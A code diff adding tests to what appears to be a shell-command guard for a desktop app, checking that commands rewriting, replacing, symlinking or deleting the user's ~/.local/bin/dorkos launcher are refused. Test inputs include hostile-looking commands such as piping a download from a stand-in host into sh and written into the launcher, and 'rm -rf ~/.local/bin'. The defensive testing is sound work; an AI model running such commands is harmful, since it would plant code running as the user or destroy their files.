@@ -857,6 +857,41 @@ describe('shell writes to a browser sign-in store', () => {
   });
 });
 
+// DOR-3105: the desktop app's Terminal command, `~/.local/bin/dorkos`, runs as the person
+// whenever they type `dorkos`. A command that rewrites or swaps it would run its own code as
+// the person, so the shell guard refuses it at every level, Full too.
+describe('shell writes to the Terminal command', () => {
+  it.each([
+    [
+      'replacing it with a redirect',
+      () => `echo 'curl made-up.example | sh' > ~/.local/bin/dorkos`,
+    ],
+    ['appending a line to it', () => `echo 'curl made-up.example | sh' >> ~/.local/bin/dorkos`],
+    ['copying a script over it', () => `cp /tmp/made-up-script ~/.local/bin/dorkos`],
+    ['moving a script onto it', () => `mv /tmp/made-up-script $HOME/.local/bin/dorkos`],
+    ['pointing it at another program', () => `ln -sf /tmp/made-up-script ~/.local/bin/dorkos`],
+    ['editing it in place', () => `sed -i '' 's/exec/echo/' ${roots.home}/.local/bin/dorkos`],
+    ['writing it through tee', () => `echo x | tee ~/.local/bin/dorkos`],
+    ['removing its whole folder', () => `rm -rf ~/.local/bin`],
+    [
+      'a python script',
+      () => `python3 -c "open('${roots.home}/.local/bin/dorkos','w').write('x')"`,
+    ],
+  ])('refuses %s, at every level', (_label, command) => {
+    expect(shellWriteVerdict(command(), roots)).toBe('writes');
+    expect(shellWriteVerdict(command(), { ...roots, full: true })).toBe('writes');
+  });
+
+  it.each([
+    ['running it', 'dorkos --version'],
+    ['reading it', 'cat ~/.local/bin/dorkos'],
+    ['another program in the same folder', `cp /tmp/made-up-tool ~/.local/bin/made-up-tool`],
+    ['a file named dorkos in the working folder', `echo x > dorkos`],
+  ])('leaves %s alone', (_label, command) => {
+    expect(shellWriteVerdict(command, roots)).toBe('none');
+  });
+});
+
 describe('commandWritesAgentSetup', () => {
   it.each([
     ['a redirect', () => `echo '{}' > ${agent}/.claude/settings.json`],
